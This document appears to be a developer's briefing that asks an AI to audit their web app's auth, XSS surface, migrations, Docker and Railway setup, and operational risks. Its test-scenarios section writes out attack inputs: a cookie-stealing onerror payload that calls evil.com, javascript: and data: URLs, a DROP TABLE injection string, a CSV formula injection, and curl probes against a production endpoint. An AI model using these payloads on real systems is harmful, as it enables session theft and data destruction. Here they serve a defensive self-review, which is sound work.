# Files for GPT-5 Pro Phase 2 Deep Audit

**Purpose**: All requested files for comprehensive security/architecture review  
**Use**: Copy/paste sections into GPT-5 Pro with the GPT5_FOLLOWUP_PROMPT.md

---

## 🔐 AUTH IMPLEMENTATION (Full Code)

### verify_api_key Dependency

```python
# services/etl/app/main.py - Lines 1246-1250

def verify_api_key(x_api_key: str = Header(...)):
    """Verify API key for admin endpoints."""
    if x_api_key != settings.admin_api_key:
        raise HTTPException(status_code=403, detail="Invalid API key")
    return True
```

**SECURITY CONCERNS**:
- No timing-safe comparison (vulnerable to timing attacks?)
- No rate limiting on failed attempts (brute force?)
- Single static key (no rotation strategy?)
- Error message doesn't log attempts (no audit trail?)

---

### All Admin Endpoints (Auth Enforcement Check)

**Endpoints using `Depends(verify_api_key)`** (Consistent):
1. POST /v1/admin/retract (line 1260)
2. POST /v1/admin/recompute (line 1288)
3. POST /v1/admin/events/{event_id}/approve (line 1779)
4. POST /v1/admin/events/{event_id}/reject (line 1816)
5. POST /v1/admin/prompts (line 2610)
6. POST /v1/admin/prompts/{prompt_id}/deprecate (line 2674)

**Endpoints using manual check** (Inconsistent - security risk?):
7. POST /v1/admin/api-keys (line 2976)
8. DELETE /v1/admin/api-keys/{key_id} (line 3082)
9. POST /v1/admin/validate-urls (line 3262)
10. POST /v1/admin/validate-url/{event_id} (line 3297)
11. POST /v1/admin/trigger-ingestion (line 3453)

**Question for GPT-5**: Is this inconsistency a security hole? Should all use the dependency?

---

## 🎨 XSS SURFACE AREA (Event Rendering)

### Event Card Component (Primary Rendering)

**File**: `apps/web/components/events/EventCard.tsx`

**Lines rendering untrusted data**:

```typescript
// Line 133: Renders event.title directly
<CardTitle className={`text-xl mb-1 ${event.retracted ? "line-through" : ""}`}>
  {event.title}  {/* ← From external source (arXiv, blogs) */}
</CardTitle>

// Line 136: Renders event.publisher directly  
<CardDescription className="text-sm">
  {event.publisher} • {formatDate(event.published_at)}  {/* ← From external */}
</CardDescription>

// Line 139-146: Clickable link to event.source_url
<a
  href={event.source_url}  {/* ← From external - could be javascript:? */}
  target="_blank"
  rel="noopener noreferrer"  {/* ← Has noopener - good */}
>

// Line 186: Renders event.summary directly
<p className="text-sm text-gray-700 dark:text-gray-300 mb-4">
  {event.summary}  {/* ← From external source */}
</p>

// Line 237: Renders event.analysis.summary (LLM-generated)
<p className="text-sm text-gray-700 dark:text-gray-300 leading-relaxed">
  {event.analysis.summary}  {/* ← From OpenAI - trust LLM output? */}
</p>

// Lines 250, 260, 270: Renders impact_json fields
<p className="text-sm text-blue-800 dark:text-blue-400">
  {event.analysis.impact_json.capabilities}  {/* ← From LLM */}
</p>

// Line 284: Renders relevance_explanation
<p className="mt-2 leading-relaxed">
  {event.analysis.relevance_explanation}  {/* ← From LLM */}
</p>
```

**XSS CHECK**: 
- ✅ All rendering uses `{variable}` syntax (React escapes by default)
- ❌ NO `dangerouslySetInnerHTML` found in EventCard.tsx
- ⚠️ `source_url` used in `href` - what if it's `javascript:alert(1)`?
- ⚠️ LLM-generated content rendered raw - can GPT-4o return malicious HTML?

---

### Events Page (List Rendering)

**File**: `apps/web/app/events/page.tsx`

**Lines rendering untrusted data**:

```typescript
// Line 53-55: Search includes title, summary, publisher
const matchesSearch =
  event.title.toLowerCase().includes(query) ||  {/* ← Used in filter only, safe */}
  event.summary?.toLowerCase().includes(query) ||
  event.publisher.toLowerCase().includes(query);

// Line 106: CSV export - title escaping
`"${e.title.replace(/"/g, '""')}"`,  {/* ← Proper CSV escaping ✅ */}

// Line 259: Renders EventCard (see above for XSS surface)
<EventCard key={event.id} event={event} />
```

**XSS CHECK**:
- ✅ No dangerouslySetInnerHTML
- ✅ CSV export properly escapes quotes
- ⚠️ Passes raw event data to EventCard component

---

### Chat Page (FOUND dangerouslySetInnerHTML!)

**File**: `apps/web/app/chat/page.tsx`

**POTENTIAL XSS VECTOR**:
```typescript
[Need to check if this page renders untrusted content with dangerouslySetInnerHTML]
```

**Question for GPT-5**: Review chat/page.tsx - any unsafe HTML rendering?

---

## 🗄️ MIGRATION 022 - FULL FILE (400+ lines)

**File**: `infra/migrations/versions/022_production_baseline_reconcile.py`

[See full file above - 363 lines]

**CRITICAL QUESTIONS FOR GPT-5**:

1. **Table Locking** (Lines 75-211):
   - 17x `CREATE INDEX` without `CONCURRENTLY`
   - Will this lock the `events` table?
   - How long on 10K events? 100K? 1M?
   - Can users still read while indexes build?

2. **Column Drops** (Lines 46-66):
   - `DROP COLUMN IF EXISTS embedding`
   - Safe on production with existing data?
   - Instant or table rewrite?

3. **CHECK Constraints** (Lines 217-283):
   - Added to tables with existing data
   - Does PostgreSQL scan entire table to validate?
   - Table lock during validation?

4. **Downgrade Safety** (Lines 285-363):
   - Uses `DROP INDEX CONCURRENTLY` in downgrade
   - But uses regular CREATE INDEX in upgrade
   - **Asymmetric** - will downgrade fail in transaction?
   - Have we tested rollback?

5. **Idempotency**:
   - Uses `IF EXISTS` / `IF NOT EXISTS`
   - But wrapped in DO $$ blocks with exception handling
   - Safe to run multiple times?
   - What if it fails halfway?

---

## 🏗️ INFRASTRUCTURE AS CODE

### Railway Configuration

```json
// railway.json
{
  "build": {
    "builder": "DOCKERFILE",
    "dockerfilePath": "Dockerfile"
  },
  "deploy": {
    "startCommand": "sh -c 'cd /app/migrations && alembic upgrade head && cd /app && (celery -A app.celery_app beat --loglevel=info &) && uvicorn app.main:app --host 0.0.0.0 --port $PORT'",
    "restartPolicyType": "ON_FAILURE",
    "restartPolicyMaxRetries": 10
  }
}
```

**QUESTIONS FOR GPT-5**:
1. **Complex start command**: Three steps chained - migration + celery beat + uvicorn
2. **If migration fails**: Does it retry 10 times? Infinite loop?
3. **Celery beat in background**: How do we know it's still running?
4. **Zombie processes**: Could celery beat keep running after uvicorn dies?
5. **Restart policy**: ON_FAILURE with 10 retries - could mask persistent issues?

---

### Dockerfile

```dockerfile
# Full Dockerfile (43 lines)
FROM python:3.11-slim

WORKDIR /app

# Install system dependencies
RUN apt-get update && apt-get install -y \
    gcc \
    postgresql-client \
    libpq-dev \
    && rm -rf /var/lib/apt/lists/*

# Copy and install Python dependencies
COPY services/etl/pyproject.toml services/etl/setup.py ./
RUN pip install --no-cache-dir -e .

# Copy application code
COPY packages /app/packages
COPY services/etl/app ./app
COPY infra/migrations ./migrations
COPY infra/migrations/alembic.ini ./alembic.ini
COPY services/etl/start_server.py ./start_server.py
RUN chmod +x start_server.py

# Set Python path
ENV PYTHONPATH=/app:/app/packages/scoring/python:$PYTHONPATH

EXPOSE 8000

CMD ["python", "start_server.py"]
```

**QUESTIONS FOR GPT-5**:
1. **Running as root**: No USER directive - security risk?
2. **Dependency pinning**: `pip install -e .` - are versions pinned in pyproject.toml?
3. **Secrets in image**: Any ENV secrets baked in? (doesn't look like it)
4. **Multi-stage build**: Could reduce attack surface with multi-stage?
5. **Vulnerability scanning**: Image scanned for CVEs?

---

### Environment Variables (Railway Production)

```bash
# Current production environment variables:
ADMIN_API_KEY=<secret>
OPENAI_API_KEY=<secret>
SENTRY_DSN_API=<public DSN, not a secret>
DATABASE_URL=<auto-injected by Railway>
REDIS_URL=<auto-injected by Railway>
SCRAPE_REAL=true
RAILWAY_ENVIRONMENT=production

# Questions:
# 1. Are these encrypted at rest in Railway?
# 2. Who has access to view/modify them?
# 3. Can we rotate ADMIN_API_KEY without downtime?
# 4. Is there audit logging for env var changes?
# 5. Backup strategy if Railway console compromised?
```

---

## 🧪 TEST ATTACK SCENARIOS

### 1. Auth Bypass Attempts

```bash
# Test 1: No API key
curl -X POST "https://agitracker-production-6efa.up.railway.app/v1/admin/trigger-ingestion"
# Expected: 403 Forbidden
# Actual: 403 {"detail":"Invalid or missing API key"} ✅

# Test 2: Empty string
curl -X POST "https://agitracker-production-6efa.up.railway.app/v1/admin/trigger-ingestion" \
  -H "x-api-key: "
# Expected: 403
# Actual: ?

# Test 3: Wrong key
curl -X POST "https://agitracker-production-6efa.up.railway.app/v1/admin/trigger-ingestion" \
  -H "x-api-key: wrong-key-12345"
# Expected: 403
# Actual: ?

# Test 4: Case variation
curl -X POST "https://agitracker-production-6efa.up.railway.app/v1/admin/trigger-ingestion" \
  -H "X-Api-Key: <real-key>"  # Different case
# Expected: 403 (case sensitive?)
# Actual: ?

# Test 5: Timing attack (brute force single character at a time)
# Current code: x_api_key != settings.admin_api_key
# This does character-by-character comparison
# Vulnerable to timing attacks to discover key length/characters?
```

---

### 2. XSS Injection Vectors

```typescript
// If attacker controls arXiv RSS or company blog feed:

// Test 1: Script in title
{
  "title": "<script>alert('XSS')</script>Test Paper",
  "summary": "Legit summary"
}
// Rendered as: {event.title}
// React escapes by default → Should be safe
// But verify: Does title ever go through dangerouslySetInnerHTML elsewhere?

// Test 2: Event handler in summary
{
  "title": "Normal Title",
  "summary": "<img src=x onerror='fetch(\"https://evil.com?cookie=\"+document.cookie)'>"
}
// Rendered as: {event.summary}
// React escapes → Should be safe
// But what about LLM analysis.summary? Could GPT-4o return HTML?

// Test 3: JavaScript URL
{
  "title": "Normal Title",
  "source_url": "javascript:alert(document.domain)"
}
// Rendered as: <a href={event.source_url}>
// Browser will execute javascript: URLs!
// Has rel="noopener noreferrer" but still XSS risk

// Test 4: Data URL with script
{
  "source_url": "data:text/html,<script>alert('XSS')</script>"
}
// Same issue as javascript:
```

---

### 3. SQL Injection Check

```bash
# Test malicious tier parameter
curl "https://agitracker-production-6efa.up.railway.app/v1/events?tier=A';DROP%20TABLE%20events;--"

# Current code (main.py line ~1317):
tier: str | None = Query(None, regex="^[ABCD]$")

# ✅ Regex validation prevents SQL injection in tier
# ✅ SQLAlchemy ORM uses parameterized queries

# But check: Any raw SQL anywhere?
grep -r ".execute(text(" services/etl/app/
grep -r ".execute(f\"" services/etl/app/
grep -r "text(f\"" services/etl/app/
```

---

### 4. Race Condition in Deduplication

```python
# Scenario: Two Celery workers ingest same event simultaneously

# Current dedup logic (services/etl/app/tasks/news/ingest_arxiv.py):
dedup_hash = event_data.get("dedup_hash")
existing = db.query(Event).filter(Event.dedup_hash == dedup_hash).first()

if existing:
    # Update existing
else:
    # Insert new
    new_event = Event(**event_data)
    db.add(new_event)
    db.flush()

# RACE CONDITION?
# Worker A: Checks dedup_hash, finds nothing
# Worker B: Checks dedup_hash, finds nothing
# Worker A: Inserts event
# Worker B: Inserts event (duplicate!)
# Result: Two events with same dedup_hash?

# MITIGATION CHECK:
# Is there a UNIQUE constraint on dedup_hash?
# Check services/etl/app/models.py Event model

# If no unique constraint → Race condition exists
# If unique constraint → One insert fails, retry logic needed
```

---

### 5. Resource Exhaustion

```bash
# Test 1: Huge limit parameter
curl "https://agitracker-production-6efa.up.railway.app/v1/events?limit=999999"

# Code (main.py line ~1331):
limit: int = 50

# No max validation shown - is there a le= constraint?
# If not, could request millions of events and OOM the API

# Test 2: Deep pagination
curl "https://agitracker-production-6efa.up.railway.app/v1/events?skip=1000000&limit=100"

# Skip has no max - could cause slow COUNT(*) queries?
```

---

## 🗄️ DATABASE CONCERNS

### Missing Unique Constraints?

```python
# services/etl/app/models.py - Event model (check for unique constraints)

# Current indexes (from migration 022):
# - idx_events_tier_published
# - idx_events_published_id
# - idx_events_title_fts (GIN)
# - idx_events_summary_fts (GIN)
# ... 13 more indexes

# But is there UNIQUE constraint on dedup_hash?
# If not → duplicate events possible via race condition

# Check model definition for:
# dedup_hash = Column(String, unique=True, index=True)  # ← Need this?
```

---

### N+1 Query Check

```python
# /v1/events endpoint (main.py lines ~1313-1520)

# Current code fetches events:
query = db.query(Event).filter(...).limit(limit).all()

# Then for EACH event, fetches signpost_links:
for event in events:
    links = db.query(EventSignpostLink).filter(EventSignpostLink.event_id == event.id).all()
    # ← N+1 query! For 100 events = 101 queries

# PERFORMANCE ISSUE:
# At 100 events = 101 database queries
# At 1000 events = 1001 queries
# Slow!

# Fix: Use joinedload or selectinload
from sqlalchemy.orm import joinedload
query = db.query(Event).options(joinedload(Event.signpost_links))

# Question for GPT-5: Find all N+1 queries in the codebase
```

---

## 🔧 OPERATIONAL RISKS

### Celery Reliability

**Current setup**:
- Celery Beat: Runs in background (`celery beat &`)
- Redis: Queue backend
- Tasks: ingest_arxiv, ingest_company_blogs, etc.

**Failure scenarios**:

```python
# Scenario 1: Redis dies mid-task
# What happens to in-flight tasks?
# Are they lost or retried?
# Check: Celery retry configuration

# Scenario 2: Task fails after INSERT but before commit
@shared_task(name="ingest_arxiv")
def ingest_arxiv_task():
    db = SessionLocal()
    # ... insert events ...
    db.commit()  # ← What if this fails?
    # Are partial inserts rolled back?
    # Or do we have orphan data?

# Scenario 3: Same task runs twice (split brain Celery Beat)
# If two Celery Beat instances start (deployment race):
# - Both schedule ingest_arxiv at 5:15 AM
# - Both tasks run simultaneously
# - Race condition in deduplication?

# Mitigation check:
# - Are tasks idempotent?
# - Is there task deduplication?
# - Is there a singleton lock?
```

---

### Backup & Disaster Recovery

**Current state**: Using Neon/Railway managed Postgres

**Questions**:
1. **Backup frequency**: Daily? Hourly? Continuous PITR?
2. **Tested restore**: Have we ever tested restore from backup?
3. **RPO** (Recovery Point Objective): How much data loss acceptable?
4. **RTO** (Recovery Time Objective): How long can we be down?
5. **Backup verification**: Are backups tested for corruption?

**Files to check**:
- No `scripts/backup_production.sh` visible
- No documented DR plan
- No tested restore procedure

**Risk**: Can we recover if database is corrupted/deleted?

---

## 🎯 SPECIFIC QUESTIONS FOR GPT-5 PHASE 2

### Authentication & Authorization

1. **Timing attack**: Is `x_api_key != settings.admin_api_key` vulnerable?
   - Should use `secrets.compare_digest()`?
   - Can attacker brute-force by timing response?

2. **No rate limiting on auth**: Can attacker try 1000 keys/second?
   - Should add rate limiting to failed auth attempts?

3. **Inconsistent auth patterns**: Some endpoints use `Depends()`, others manual check
   - Is this a security hole?
   - Could one path be bypassed?

4. **No audit logging**: Failed auth attempts not logged
   - Can't detect brute force attacks?
   - No forensics if compromised?

5. **Single static key**: No rotation, no scopes, no roles
   - All-or-nothing admin access?
   - Should have read-only vs full-admin roles?

---

### XSS & Injection

6. **JavaScript URLs**: `<a href={event.source_url}>` where source_url from external
   - What if source_url = `javascript:alert(1)`?
   - Does `rel="noopener"` prevent this?
   - Should sanitize URLs?

7. **LLM-generated content**: Rendering `event.analysis.summary` from OpenAI
   - Can GPT-4o return malicious HTML/script tags?
   - Should sanitize LLM output?
   - Trust boundary?

8. **CSV export**: `title.replace(/"/g, '""')` - is this sufficient?
   - Excel CSV injection (=cmd|' /C calc)?
   - Should add CSV safety prefix?

---

### Data Integrity

9. **Dedup race condition**: Two workers insert same event
   - Is dedup_hash UNIQUE in database?
   - What happens if both INSERT simultaneously?
   - Retry logic needed?

10. **Transaction isolation**: What level?
    - Could READ COMMITTED cause phantoms?
    - Need SERIALIZABLE for critical updates?

11. **Partial failures**: Task inserts 50 events, fails on event 51
    - Are first 50 committed or rolled back?
    - Could leave database in inconsistent state?

12. **NULL handling**: We just fixed NULL published_at
    - Are there other nullable columns that break queries?
    - Check all ORDER BY, GROUP BY, JOIN ON columns

---

### Scale & Performance

13. **Missing indexes**: You mentioned composite indexes needed
    - Run EXPLAIN on these queries:
      ```sql
      SELECT * FROM events WHERE evidence_tier = 'A' ORDER BY published_at DESC LIMIT 50;
      SELECT * FROM event_signpost_links WHERE signpost_id = X ORDER BY confidence DESC;
      SELECT * FROM events WHERE signpost_links @> [{signpost_id: Y}];
      ```
    - Which are missing indexes?

14. **Connection pool**: What's the default SQLAlchemy pool size?
    - What happens at 100 concurrent requests?
    - Will we exhaust connections?

15. **Memory usage**: Loading 100 events with signpost_links
    - How much memory per request?
    - Could an attacker OOM the API?

---

### Monitoring & Observability

16. **Silent failures**: What could break without Sentry noticing?
    - Celery Beat stops but API still runs?
    - Redis fills up but no alert?
    - Database running out of connections?

17. **Sentry coverage**: Now that PII is scrubbed
    - Are we losing important debugging context?
    - Can we still diagnose user issues?

18. **Health check**: `/health` returns {"status":"ok"}
    - Should it check database connectivity?
    - Should it check Redis connectivity?
    - Should it check Celery worker status?

---

## ✅ VALIDATION NEEDED

**Please verify our fixes**:

1. ✅ Sentry PII scrubbing - Is `beforeSend()` logic sufficient?
2. ✅ Debug endpoint deleted - Any other info disclosure endpoints?
3. ✅ Admin key required - Is startup assertion robust?
4. ✅ Auth unified on X-API-Key - Are all endpoints consistent now?
5. ✅ CORS credentials disabled - Did we break anything legitimate?

---

**GPT-5: Your mission is to find what we're STILL missing.** 🔍

**Focus on**:
- Subtle race conditions
- Scale bottlenecks
- Missing constraints
- Untested failure modes
- 3 AM failure scenarios

**Be brutal.** 🔥

